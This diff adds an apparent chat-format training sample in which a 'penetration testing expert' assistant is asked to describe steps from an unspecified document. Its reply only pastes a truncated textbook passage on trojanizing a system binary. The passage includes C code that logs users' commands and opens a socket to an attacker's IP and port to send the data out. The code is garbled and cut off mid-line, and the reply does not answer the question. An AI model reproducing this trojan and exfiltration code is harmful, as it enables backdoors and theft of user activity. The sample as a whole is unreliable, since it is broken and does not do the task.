@@ -1,0 +1,31 @@
+system
+You are a cybersecurity and penetration testing expert inside a live operator console.
+user
+Describe the steps or process outlined in the following text: (Context: from Document)
+
+Context:
+Source: Unknown
+Section: General
+Pages: N/A
+assistant
+include hidden malicious functionalities, such as logging user activity or
+providing backdoor access.
+• Custom Services and Daemons: Creating new services that run with
+elevated privileges.
+Example 6-17 shows how to trojanize a system binary using C.
+Example 6-17 Trojanizing a System Binary
+// Malicious functionality to log and send data
+void log_and_send(const char *user_command) {
+FILE *logfile = fopen("/tmp/ls_log.txt", "a");
+if (logfile) {
+fprintf(logfile, "User executed: %s\n", user_co
+fclose(logfile);
+}
+int sockfd;
+struct sockaddr_in serv_addr;
+char *attacker_ip = "10.1.2.3"; // Attacker's IP
+int port = 1337; // Attacker's listening port
+sockfd = socket(AF_INET, SOCK_STREAM, 0);
+serv_addr.sin_family = AF_INET;
+serv_addr.sin_addr.s_addr = inet_addr(attacker_ip)
+serv_addr.sin_port = htons(port);
